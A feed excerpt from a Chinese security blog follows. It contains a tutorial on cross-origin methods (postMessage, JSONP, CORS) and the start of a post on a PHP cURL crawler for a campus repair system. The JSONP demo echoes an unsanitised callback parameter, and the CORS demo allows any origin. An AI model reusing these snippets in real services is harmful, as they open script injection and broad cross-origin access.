id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h3><p>HTML5引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p><p>这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。</p><p>向外界窗口发送消息<br>postMessage方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin);</span><br></pre></td></tr></table></figure><ul><li><p>otherWindow:  指目标窗口，也就是给哪个window发消息。</p></li><li><p>message: 要发送的消息，类型为 String、Object (IE8、9 不支持)</p></li><li><p>targetOrigin: 是限定消息接收范围，不限制请使用 ‘*’</p></li></ul><p>接受信息的”message”事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var onmessage = function (event) &#123;</span><br><span class="line">    var data = event.data;</span><br><span class="line">    var origin = event.origin;</span><br><span class="line">    //do someing</span><br><span class="line">&#125;;</span><br><span class="line">if (typeof window.addEventListener != &apos;undefined&apos;) &#123;</span><br><span class="line">    window.addEventListener(&apos;message&apos;, onmessage, false);</span><br><span class="line">&#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123;</span><br><span class="line">    //for ie</span><br><span class="line">    window.attachEvent(&apos;onmessage&apos;, onmessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回调函数第一个参数接收 event 对象，有三个常用属性：</p><ul><li>data:  消息</li><li>origin:  消息来源地址</li><li>source:  源 DOMWindow 对象</li></ul><h4 id="实验-4-iframe-window-postMessage"><a href="#实验-4-iframe-window-postMessage" class="headerlink" title="实验 4 iframe window.postMessage"></a>实验 4 iframe window.postMessage</h4><p>example.com/a.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;postmessage&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;example.com/a.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        if (typeof window.postMessage === undefined) &#123;</span><br><span class="line">            alert(&quot;浏览器不支持postMessage！&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            window.top.postMessage(&quot;Uknow&quot;, &quot;http://w2.example.com&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>w2.example.com/b.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;w2.example.com -- iframe-postmessage&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;w2.example.com/b.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function test()&#123;</span><br><span class="line">        if (typeof window.postMessage === undefined) &#123;</span><br><span class="line">            alert(&quot;浏览器不支持postMessage！&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            window.addEventListener(&quot;message&quot;, function(e)&#123;</span><br><span class="line">                if (e.origin == &quot;http://example.com&quot;) &#123; //只接收指定的源发来的消息</span><br><span class="line">                    alert(e.data);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;http://example.com/a.html&quot; onload=&quot;test()&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-mess.png" alt=""></p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。</p><p>JSONP实现跨域请求的原理简单的说，就是动态创建script标签，然后利用script的src 不受同源策略约束来跨域获取数据。</p><p>JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><h4 id="实验-5-JSONP"><a href="#实验-5-JSONP" class="headerlink" title="实验 5 JSONP"></a>实验 5 JSONP</h4><p>example.com/a.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jsonp-test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function callback_data (data) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;http://w2.example.com/jsonp.php?callback=callback_data&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>w2.example.com/jsonp.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $callback = $_GET[&apos;callback&apos;];  // 获取回调函数名</span><br><span class="line">    $arr = array(&quot;name&quot; =&gt; &quot;Uknow&quot;, &quot;blog&quot; =&gt; &quot;uknowsec.cn&quot;); // 要请求的数据</span><br><span class="line">    echo $callback.&quot;(&quot;. json_encode($arr) .&quot;);&quot;; // 输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>w2.example.com目录下的jsonp.php文件获取数据时，地址后面跟了一个callback参数（一般的就是用callback这个参数名，你也可以用其他的参数名代替）。</p><p>如果你要获取数据的页面是你不能控制的，那你只能根据它所提供的接口格式进行获取。</p><p>因为我们的type规定是当成是一个javascript文件来引入的，所以php文件返回的应该是一个可执行的js文件。</p><p>访问w2.example.com/jsonp.php 控制台打印出：</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console.png" alt=""></p><p>通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，同时把我们需要的json数据作为参数传入。所以jsonp是需要服务器端和客户端相互配合的。</p><p>知道jsonp跨域的原理后我们就可以用js动态生成script标签来进行跨域操作了，而不用特意的手动的书写那些script标签。比如jQuery封装的方法就能很方便的来进行jsonp操作了。</p><p>我们在example.com中引用JQuery.js用它封装好的方法进行jsonp操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://w2.example.com/jsonp.php?callback=?&quot;, function(data)&#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console1.png" alt=""></p><p>原理是一样的，只不过我们不需要手动的插入script标签以及定义回掉函数。jQuery会自动生成一个全局函数来替换callback=?中的问号，之后获取到数据后又会自动销毁，实际上就是起一个临时代理函数的作用。</p><p>从请求的url和响应的数据就可以很明显的看出来了：</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console2.png" alt=""></p><p>jQuery214040478116061364444_1522324096074 就是一个临时代理函数。</p><p>$.getJSON方法会自动判断是否跨域，不跨域的话，就调用普通的ajax方法；跨域的话，则会以异步加载js文件的形式来调用jsonp的回调函数。</p><p>另外jsonp是无法post数据的，尽管jQuery.getJSON(url, [data], [callback]); 提供data参数让你可以携带数据发起请求，但这样是以get方式传递的。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//$.getJSON()方法</span><br><span class="line">$.getJSON(&quot;http://127.0.0.1:9000/jsonp.php?callback=?&quot;, &#123;u:&apos;abc&apos;, p: &apos;123&apos;&#125;, function(jsonData)&#123;</span><br><span class="line">    console.log(jsonData);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console3.png" alt=""></p><p>调用$.ajax()方法指定type为post，它还是会转成get方式请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &apos;post&apos;,</span><br><span class="line">    url: &quot;http://w2.example.com/jsonp.php&quot;,</span><br><span class="line">    crossDomain: true,</span><br><span class="line">    data: &#123;u: &apos;Uknow&apos;, age: 20&#125;,</span><br><span class="line">    dataType: &quot;jsonp&quot;,</span><br><span class="line">    success: function(r)&#123;</span><br><span class="line">        console.log(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console4.png" alt=""></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS定义一种跨域访问的机制，全称是”跨域资源共享”（Cross-origin resource sharing），可以让AJAX实现跨域访问。CORS 允许一个域上的网络应用向另一个域提交跨域 AJAX 请求。实现此功能非常简单，只需由服务器发送一个响应标头即可。</p><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p><p>只要同时满足以下两大条件，就属于简单请求。</p><p>（1) 请求方法是以下三种方法之一：</p><ul><li>HEAD</li><li>GET</li><li>POST</li></ul><p>（2）HTTP的头信息不超出以下几种字段：</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Last-Event-ID</li><li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</li></ul><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><p>浏览器对这两种请求的处理，是不一样的。</p><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。</p><p>Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</p><p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p><p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p><p>即服务器响应头设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;); // &quot;*&quot;号表示允许任何域向服务器端提交请求；也可以设置指定的域名，那么就允许来自这个域的请求：</span><br><span class="line">header(&apos;Access-Control-Allow-Methods: POST&apos;);</span><br><span class="line">header(&apos;Access-Control-Max-Age: 1000&apos;);</span><br></pre></td></tr></table></figure><ul><li>Access-Control-Allow-Origin:该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</li><li>Access-Control-Allow-Methods:该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</li><li>Access-Control-Max-Age:该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</li></ul><p>example.com/cors.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &apos;post&apos;,</span><br><span class="line">    url: &quot;http://w2.example.com/cors.php&quot;,</span><br><span class="line">    crossDomain: true,</span><br><span class="line">    data: &#123;u: &apos;Uknow&apos;, age: 20&#125;,</span><br><span class="line">    dataType: &quot;json&quot;,</span><br><span class="line">    success: function(r)&#123;</span><br><span class="line">        console.log(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>w2.example.com/cors.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line">    header(&apos;Access-Control-Allow-Methods: POST&apos;);</span><br><span class="line">    header(&apos;Access-Control-Max-Age: 1000&apos;);</span><br><span class="line">    if($_POST)&#123;</span><br><span class="line">        $arr = array(&apos;name&apos; =&gt; $_POST[&apos;u&apos;], &apos;age&apos; =&gt; $_POST[&apos;age&apos;]);</span><br><span class="line">        echo json_encode($arr);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo json_encode([]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/w2-console5.png" alt=""></p><p>这样也是可以实现跨域post数据的。</p><p>兼容性。CORS是W3C中一项较新的方案，所以部分浏览器还没有对其进行支持或者完美支持，详情可移至 <a href="http://www.w3.org/TR/cors/。" target="_blank" rel="noopener">http://www.w3.org/TR/cors/。</a><br>安全问题。CORS提供了一种跨域请求方案，但没有为安全访问提供足够的保障机制，如果你需要信息的绝对安全，不要依赖CORS当中的权限制度，应当使用更多其它的措施来保障。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnblogs.com/alsy/p/5470772.html" target="_blank" rel="noopener">js实现跨域</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">浏览器同源政策及其规避方法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h2&gt;&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP爬虫-物业报修系统一键校园物业报修</title>
    <link href="https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%A0%A1%E5%9B%AD%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE.html"/>
    <id>https://uknowsec.cn/posts/notes/PHP爬虫-物业报修系统一键校园物业报修.html</id>
    <published>2018-03-23T05:14:30.000Z</published>
    <updated>2018-05-03T10:01:20.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面两个爬虫都是基于正方教务系统的，这个爬虫是根据学校的一个物业报修系统写的。</p><p>login_baoxiu.php页面有用到一个js做的select二级联动的操作。</p><p>require_baoxiu.php页面也就是三个post请求。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="login-baoxiu-php"><a href="#login-baoxiu-php" class="headerlink" title="login_baoxiu.php"></a>login_baoxiu.php</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/psb2.png" alt=""></p><p>以上界面中的保修物品里是需要一个select的二级联动的。</p><h3 id="select二级联动"><a href="#select二级联动" class="headerlink" title="select二级联动"></a>select二级联动</h3><p>这里简单的看一个二级联动的JS代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select  id=&quot;a&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select id=&quot;b&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;&quot;&gt;请选择&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>两个select标签，id=a的标签是第一级，id=b的标签是第二级。</p><p>再看JS代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var json = [&#123;</span><br><span class="line"></span><br><span class="line">              id: 1,</span><br><span class="line">              name: &apos;蔬菜&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;白菜&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;萝卜&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;菠菜&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;, &#123;</span><br><span class="line">              id: 2,</span><br><span class="line">              name: &apos;肉类&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;猪肉&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;羊肉&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;牛肉&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;, &#123;</span><br><span class="line">              id: 3,</span><br><span class="line">              name: &apos;蛋类&apos;,</span><br><span class="line">              child: [&#123;</span><br><span class="line">                  id: &apos;1&apos;,</span><br><span class="line">                  name: &apos;鸡蛋&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;2&apos;,</span><br><span class="line">                  name: &apos;鹅蛋&apos;</span><br><span class="line">              &#125;, &#123;</span><br><span class="line">                  id: &apos;3&apos;,</span><br><span class="line">                  name: &apos;鸭蛋&apos;</span><br><span class="line">              &#125;]</span><br><span class="line">          &#125;];</span><br><span class="line">    var a = document.getElementById(&apos;a&apos;);</span><br><span class="line">    var b = document.getElementById(&apos;b&apos;);</span><br><span class="line">json.map(function(s)&#123;   //相当于for循环，遍历json，这里s相当于一个json[i]</span><br><span class="line">            createop(s,a);        //这个函数是创建option并添加到select的函数，第一个参数是遍历的json[i],第二个是第一个select。第一个select的创建完成了。</span><br><span class="line">          &#125;);</span><br><span class="line">    a.onchange = function()&#123;    //当第一个select改变时</span><br><span class="line">            b.innerHTML = &apos;&apos;;         //清空第二个select的option   </span><br><span class="line">            json.map(function(s)&#123;    //遍历json</span><br><span class="line">                if(s.id==this.options[this.selectedIndex].id)&#123; //当你选中的option的id和json[i]的id相同时，也就是取到你第一个select选择的json[i].</span><br><span class="line">                    s.child.map(function(x)&#123;    //遍历这个json[i].child,得到每个分类</span><br><span class="line">                        createop(x,b);          //根据每个分类创建option添加到第二个select上</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;.bind(this));  //绑定this，改变this指向为a</span><br><span class="line">          &#125;</span><br><span class="line">    function createop(h,parent)&#123;</span><br><span class="line">              var op = document.createElement(&apos;option&apos;);  //创建option</span><br><span class="line">              var op_t = document.createTextNode(h.name);  //创建option的文字</span><br><span class="line">              op.appendChild(op_t);                    //添加文字到option中</span><br><span class="line">              op.id = h.id;                            //option的id赋值</span><br><span class="line">              parent.appendChild(op);                 //把option添加到传过来的select中</span><br><span class="line">          &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>在这个JS代码里定义了一个JSON对象来存放select的value值，从JSON中可以看出一共有3个父节点，每个父节点都有自己的子节点。</p><p>然后通过下面的js代码实现，当我们第一个select创建option时，遍历json把第一个select的子节点创建option添加到第二个select上</p><p>实现select标签的二级联动功能。这里根据require_baoxiu.php里面的提交数据POST包，把以上代码demo进行了一下修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createop(h,parent)&#123;</span><br><span class="line">             var op = document.createElement(&apos;option&apos;);  //创建option</span><br><span class="line">             var op_t = document.createTextNode(h.name);  //创建option的文字</span><br><span class="line">             op.appendChild(op_t);                    //添加文字到option中</span><br><span class="line">  var op_a = document.createTextNode(h.id);  //创建option的id</span><br><span class="line">             op.appendChild(op_a);                    //添加id到option中</span><br><span class="line">             op.id = h.id;//option的id赋值</span><br><span class="line">             parent.appendChild(op);                 //把option添加到传过来的select中</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>在这里，我把json中的id和name值都添加到了select,因为传给后面的参数需要这个ID值作为POST提交参数。</p><h3 id="require-baoxiu-php"><a href="#require-baoxiu-php" class="headerlink" title="require_baoxiu.php"></a>require_baoxiu.php</h3><p>获取到login_baoxiu.php提交过来的表单变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$userId=$_POST[&apos;account&apos;];</span><br><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">$patterns = &quot;/\d+/&quot;;</span><br><span class="line">preg_match_all($patterns,$_POST[&apos;type1&apos;],$arr1);</span><br><span class="line">$type1=$arr1[0][0];</span><br><span class="line">preg_match_all($patterns,$_POST[&apos;type2&apos;],$arr2);</span><br><span class="line">$type2=$arr2[0][0];</span><br><span class="line">$districtname=$_POST[&apos;districtname&apos;];</span><br><span class="line">$floorid=$_POST[&apos;floorid&apos;];</span><br><span class="line">$dormitoryid=$_POST[&apos;dormitoryid&apos;];</span><br><span class="line">$phone=$_POST[&apos;phone&apos;];</span><br><span class="line">$describe=$_POST[&apos;describe&apos;];</span><br></pre></td></tr></table></figure><p>由于$type1和$type2变量传过来的是一个name+id的值，我们需要把name剔除。利用正则得到id值。</p><p>下面还是用到CURL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function login_post($url,$cookie,$post)&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</span><br><span class="line">        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </span><br><span class="line">        curl_setopt($ch, CURLOPT_REFERER, &apos;http://localhost/Repair/&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</span><br><span class="line">        $result=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样先获取cookie值，保存cookie。步骤跟正方教务系统是相同的。</p><p>整体的分析下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$login_url= &apos;http://localhost/Repair/UserServlet&apos;;</span><br><span class="line">$post=array(</span><br><span class="line">&apos;flag&apos;=&gt; &apos;toCheckStuLogin&apos;,</span><br><span class="line">&apos;userId&apos; =&gt; $userId,</span><br><span class="line">&apos;password&apos; =&gt; $password</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">$login_con = login_post($login_url,$cookie,http_build_query($post));</span><br></pre></td></tr></table></figure><p>登录到报修系统，这里用到的http_build_query()函数，而post请求包也是用到array，在上一篇说到的问题。</p><p>因为我们用到了http_build_query()函数，所以Content-Type还是application/x-www-form-urlencoded。</p><p>http_build_query()函数的作用就是是使用给出的关联(或下标)数组生成一个经过 URL-encode 的请求字符串。</p><p>然后更加抓包分析，我们需要把用户提交的地址更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 